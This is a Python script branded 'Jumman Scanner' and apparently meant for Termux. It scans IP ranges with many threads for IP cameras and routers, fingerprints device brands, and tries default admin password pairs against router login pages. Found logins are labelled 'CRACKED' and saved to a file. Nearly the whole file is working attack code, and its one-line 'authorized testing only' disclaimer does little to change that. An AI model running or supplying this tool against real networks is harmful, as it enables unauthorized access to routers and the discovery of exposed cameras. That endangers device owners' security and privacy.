#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║     🔥 JUMMAN SCANNER - TERMUX EDITION 🔥                 ║
║     📷 IP Camera & Router Scanner                          ║
║     👑 Owner: Jumman                                       ║
║     🔐 Password: ch71                                     ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
"""

import os
import sys
import time
import socket
import ipaddress
import subprocess
import re
import threading
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor
import requests

# ============ PASSWORD PROTECTION ============
REQUIRED_PASSWORD = "ch71"

def check_password():
    """Check password before running tool"""
    print("\n" + "=" * 50)
    print("🔐 JUMMAN SCANNER - PASSWORD PROTECTED")
    print("=" * 50)
    print("\n⚠️  This tool is password protected!")
    print("👑 Owner: Jumman")
    print("📱 Version: 3.2\n")
    
    attempts = 3
    for attempt in range(attempts):
        password = input(f"🔑 Enter password ({attempts - attempt} attempts left): ").strip()
        
        if password == REQUIRED_PASSWORD:
            print("\n✅ Access Granted! Loading tool...\n")
            time.sleep(1)
            return True
        else:
            print(f"❌ Wrong password! {attempts - attempt - 1} attempts remaining\n")
    
    print("\n🚫 Access Denied! Too many failed attempts.")
    print("Contact the administrator for access.")
    sys.exit(1)

# ============ SCANNER CLASS ============
class JummanScanner:
    def __init__(self):
        self.cameras = []
        self.routers = []
        self.cracked = []
        self.scanning = False
        self.total_ips = 0
        self.scanned = 0
        
    def clear_screen(self):
        os.system('cls' if os.name == 'nt' else 'clear')
    
    def print_banner(self):
        banner = """
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║     🔥 JUMMAN SCANNER - TERMUX EDITION 🔥                 ║
║     📷 IP Camera & Router Scanner                          ║
║     👑 Owner: Jumman                                       ║
║     🔐 Password Protected                                  ║
║     ⚡ Super Fast Scanner                                  ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
        """
        print(banner)
        print(f"[✓] Owner: Jumman")
        print(f"[✓] Version: 3.2")
        print(f"[✓] Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        print("=" * 60)
    
    def validate_ip(self, ip_str):
        try:
            ipaddress.IPv4Address(ip_str)
            return True
        except:
            return False
    
    def get_local_ip(self):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            local_ip = s.getsockname()[0]
            s.close()
            return local_ip
        except:
            return None
    
    def extract_title(self, html_content):
        try:
            match = re.search(r'<title[^>]*>(.*?)</title>', html_content, re.IGNORECASE | re.DOTALL)
            if match:
                return match.group(1).strip()
            return "No Title"
        except:
            return "No Title"
    
    def get_brand(self, content, device_type):
        """Identify brand from content"""
        if device_type == 'Camera':
            if 'hikvision' in content:
                return 'HIK Vision'
            elif 'dahua' in content:
                return 'Dahua'
            elif 'tenda' in content:
                return 'Tenda'
            elif 'tp-link' in content:
                return 'TP-Link'
            elif 'd-link' in content or 'dlink' in content:
                return 'D-Link'
            elif 'reolink' in content:
                return 'Reolink'
            elif 'amcrest' in content:
                return 'Amcrest'
            elif 'foscam' in content:
                return 'Foscam'
            elif 'axis' in content:
                return 'Axis'
            else:
                return 'Unknown'
        elif device_type == 'Router':
            if 'tenda' in content:
                return 'Tenda'
            elif 'd-link' in content or 'dlink' in content:
                return 'D-Link'
            elif 'tp-link' in content or 'tplink' in content:
                return 'TP-Link'
            else:
                return 'Unknown'
        return 'Unknown'
    
    def test_credentials(self, url):
        """Test 4 passwords on router"""
        credentials = [
            ('admin', 'admin'),
            ('admin', 'admin1'),
            ('admin', 'admin2'),
            ('admin', 'admin123')
        ]
        
        login_paths = ['/', '/login', '/login.html', '/admin', '/cgi-bin/login']
        
        for username, password in credentials:
            for path in login_paths:
                try:
                    test_url = url + path
                    form_data = {
                        'username': username,
                        'password': password,
                        'user': username,
                        'pass': password,
                        'usr': username,
                        'pwd': password,
                    }
                    response = requests.post(test_url, data=form_data, timeout=2, 
                                            allow_redirects=True, verify=False)
                    
                    if response.status_code == 200:
                        content = response.text.lower()
                        if 'invalid' not in content and 'incorrect' not in content:
                            return {
                                'username': username,
                                'password': password,
                                'url': test_url
                            }
                except:
                    pass
        
        return None
    
    def scan_single_ip(self, ip):
        """Scan single IP for camera or router"""
        results = []
        ports = [80, 8080, 443, 8081, 554, 8000, 37777]
        
        for port in ports:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(0.5)
                result = sock.connect_ex((ip, port))
                sock.close()
                
                if result == 0:
                    try:
                        protocol = 'https' if port == 443 else 'http'
                        url = f"{protocol}://{ip}:{port}"
                        response = requests.get(url, timeout=2, verify=False, allow_redirects=True)
                        
                        if response.status_code in [200, 401, 403]:
                            content = response.text.lower()
                            title = self.extract_title(response.text)
                            
                            # Camera detection
                            camera_keywords = ['camera', 'cam', 'ipcam', 'web service', 'dvr', 
                                             'hikvision', 'dahua', 'login.asp', 'web', 'cgi-bin',
                                             'snapshot', 'video', 'stream', 'live']
                            is_camera = any(kw in content for kw in camera_keywords)
                            
                            # Router detection
                            router_keywords = ['tenda', 'd-link', 'dlink', 'tp-link', 'tplink', 
                                             'router', 'admin', 'login', 'gateway']
                            is_router = any(kw in content for kw in router_keywords)
                            
                            if is_camera:
                                brand = self.get_brand(content, 'Camera')
                                results.append({
                                    'ip': ip,
                                    'port': port,
                                    'type': 'Camera',
                                    'brand': brand,
                                    'title': title,
                                    'url': url
                                })
                            elif is_router:
                                brand = self.get_brand(content, 'Router')
                                creds = self.test_credentials(url)
                                
                                results.append({
                                    'ip': ip,
                                    'port': port,
                                    'type': 'Router',
                                    'brand': brand,
                                    'url': url,
                                    'credentials': creds
                                })
                    except:
                        pass
            except:
                pass
        
        return results
    
    def scan_range(self, start_ip, end_ip):
        """Scan IP range"""
        results = []
        try:
            start = int(ipaddress.IPv4Address(start_ip))
            end = int(ipaddress.IPv4Address(end_ip))
            
            if start > end:
                return {'error': 'Start IP must be less than End IP'}
            
            ip_list = []
            for ip_int in range(start, end + 1):
                if ip_int - start > 1000:
                    print("[!] Limited to 1000 IPs for performance")
                    break
                ip_list.append(str(ipaddress.IPv4Address(ip_int)))
            
            self.total_ips = len(ip_list)
            self.scanned = 0
            
            print(f"\n[*] Scanning {self.total_ips} IPs...\n")
            
            with ThreadPoolExecutor(max_workers=150) as executor:
                future_results = executor.map(self.scan_single_ip, ip_list)
                for result in future_results:
                    self.scanned += 1
                    if self.scanned % 10 == 0:
                        print(f"\r[*] Progress: {self.scanned}/{self.total_ips} IPs", end='')
                        sys.stdout.flush()
                    if result:
                        results.extend(result)
            
            print()
            return results
        except Exception as e:
            return {'error': str(e)}
    
    def display_results(self, results):
        """Display scan results"""
        if not results:
            print("\n❌ No devices found.")
            return
        
        cameras = [r for r in results if r['type'] == 'Camera']
        routers = [r for r in results if r['type'] == 'Router']
        cracked = [r for r in routers if r.get('credentials')]
        
        print("\n" + "=" * 60)
        print("📊 SCAN RESULTS")
        print("=" * 60)
        print(f"\n📷 Cameras Found: {len(cameras)}")
        print(f"🌐 Routers Found: {len(routers)}")
        print(f"💀 Cracked: {len(cracked)}")
        
        if cameras:
            print("\n" + "-" * 40)
            print("📷 CAMERAS:")
            print("-" * 40)
            for i, cam in enumerate(cameras, 1):
                print(f"\n{i}. {cam['ip']}:{cam['port']}")
                print(f"   Brand: {cam['brand']}")
                print(f"   Title: {cam['title'][:50]}")
                print(f"   URL: {cam['url']}")
        
        if routers:
            print("\n" + "-" * 40)
            print("🌐 ROUTERS:")
            print("-" * 40)
            for i, router in enumerate(routers, 1):
                print(f"\n{i}. {router['ip']}:{router['port']}")
                print(f"   Brand: {router['brand'].upper()}")
                print(f"   URL: {router['url']}")
                if router.get('credentials'):
                    cred = router['credentials']
                    print(f"   ✅ CRACKED: {cred['username']}:{cred['password']}")
                else:
                    print(f"   ❌ Not Cracked")
        
        if cracked:
            print("\n" + "-" * 40)
            print("💀 CRACKED CREDENTIALS:")
            print("-" * 40)
            for i, c in enumerate(cracked, 1):
                if c.get('credentials'):
                    cred = c['credentials']
                    print(f"\n{i}. {c['ip']} [{c['brand'].upper()}]")
                    print(f"   👤 {cred['username']}:{cred['password']}")
                    print(f"   🔗 {cred['url']}")
        
        print("\n" + "=" * 60)
    
    def save_results(self, results):
        """Save results to file"""
        if not results:
            return
        
        filename = f"scan_results_{int(time.time())}.txt"
        
        try:
            with open(filename, 'w') as f:
                f.write("=" * 60 + "\n")
                f.write("JUMMAN SCANNER - SCAN RESULTS\n")
                f.write("=" * 60 + "\n")
                f.write(f"Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
                f.write("=" * 60 + "\n\n")
                
                cameras = [r for r in results if r['type'] == 'Camera']
                routers = [r for r in results if r['type'] == 'Router']
                
                if cameras:
                    f.write("📷 CAMERAS FOUND:\n")
                    f.write("-" * 40 + "\n")
                    for cam in cameras:
                        f.write(f"IP: {cam['ip']}:{cam['port']}\n")
                        f.write(f"Brand: {cam['brand']}\n")
                        f.write(f"Title: {cam['title']}\n")
                        f.write(f"URL: {cam['url']}\n")
                        f.write("-" * 40 + "\n")
                    f.write("\n")
                
                if routers:
                    f.write("🌐 ROUTERS FOUND:\n")
                    f.write("-" * 40 + "\n")
                    for router in routers:
                        f.write(f"IP: {router['ip']}:{router['port']}\n")
                        f.write(f"Brand: {router['brand'].upper()}\n")
                        if router.get('credentials'):
                            cred = router['credentials']
                            f.write(f"CRACKED: {cred['username']}:{cred['password']}\n")
                            f.write(f"URL: {cred['url']}\n")
                        else:
                            f.write("Not Cracked\n")
                        f.write("-" * 40 + "\n")
                    f.write("\n")
                
                f.write("=" * 60 + "\n")
                f.write(f"Total IPs Scanned: {self.total_ips}\n")
                f.write(f"Cameras Found: {len(cameras)}\n")
                f.write(f"Routers Found: {len(routers)}\n")
                f.write(f"Cracked: {len([r for r in routers if r.get('credentials')])}\n")
            
            print(f"\n✅ Results saved to: {filename}")
        except Exception as e:
            print(f"\n❌ Error saving: {e}")
    
    def run(self):
        """Main execution"""
        self.clear_screen()
        self.print_banner()
        
        print("\n⚠️  LEGAL DISCLAIMER:")
        print("This tool is for authorized testing only.")
        print("Unauthorized access to networks is illegal.\n")
        
        print("📌 SCAN OPTIONS:")
        print("1. Quick Scan (Local Network - 50 IPs)")
        print("2. Custom IP Range")
        print("3. Full Network Scan (All Common Ranges)")
        print("4. Exit")
        print()
        
        choice = input("Select option (1-4): ").strip()
        
        if choice == '1':
            # Quick Scan
            local_ip = self.get_local_ip()
            if not local_ip:
                print("❌ Could not detect local network!")
                return
            
            subnet = ".".join(local_ip.split(".")[:3])
            start_ip = f"{subnet}.1"
            end_ip = f"{subnet}.50"
            
            print(f"\n⚡ Quick Scan: {start_ip} - {end_ip}")
            results = self.scan_range(start_ip, end_ip)
            
            if isinstance(results, dict) and 'error' in results:
                print(f"\n❌ Error: {results['error']}")
                return
            
            self.display_results(results)
            
            save = input("\n💾 Save results? (y/n): ").strip().lower()
            if save == 'y':
                self.save_results(results)
        
        elif choice == '2':
            # Custom Range
            print("\n🔍 Enter IP Range:")
            start_ip = input("Start IP: ").strip()
            end_ip = input("End IP: ").strip()
            
            if not self.validate_ip(start_ip) or not self.validate_ip(end_ip):
                print("❌ Invalid IP format!")
                return
            
            results = self.scan_range(start_ip, end_ip)
            
            if isinstance(results, dict) and 'error' in results:
                print(f"\n❌ Error: {results['error']}")
                return
            
            self.display_results(results)
            
            save = input("\n💾 Save results? (y/n): ").strip().lower()
            if save == 'y':
                self.save_results(results)
        
        elif choice == '3':
            # Full Scan
            print("\n🌍 Full Network Scan Started!")
            print("Scanning common ranges...")
            print("• 192.168.1.1 - 192.168.1.254")
            print("• 192.168.0.1 - 192.168.0.254")
            print("• 10.0.0.1 - 10.0.0.254")
            print("• 172.16.0.1 - 172.16.0.254")
            print("\n⏳ This may take a while...\n")
            
            all_results = []
            ranges = [
                ('192.168.1.1', '192.168.1.254'),
                ('192.168.0.1', '192.168.0.254'),
                ('10.0.0.1', '10.0.0.254'),
                ('172.16.0.1', '172.16.0.254'),
            ]
            
            for start, end in ranges:
                print(f"\n[*] Scanning: {start} - {end}")
                results = self.scan_range(start, end)
                if isinstance(results, list):
                    all_results.extend(results)
            
            self.display_results(all_results)
            
            save = input("\n💾 Save results? (y/n): ").strip().lower()
            if save == 'y':
                self.save_results(all_results)
        
        elif choice == '4':
            print("\n👋 Goodbye!")
            sys.exit(0)
        
        else:
            print("❌ Invalid choice!")
        
        input("\nPress Enter to continue...")


# ============ MAIN ============
def main():
    try:
        # Check password first
        check_password()
        
        # Check dependencies
        try:
            import requests
        except ImportError:
            print("[*] Installing requests...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", "requests"])
        
        # Run scanner
        scanner = JummanScanner()
        while True:
            scanner.run()
    except KeyboardInterrupt:
        print("\n\n[!] Interrupted by user")
        sys.exit(0)
    except Exception as e:
        print(f"\n[!] Error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    main()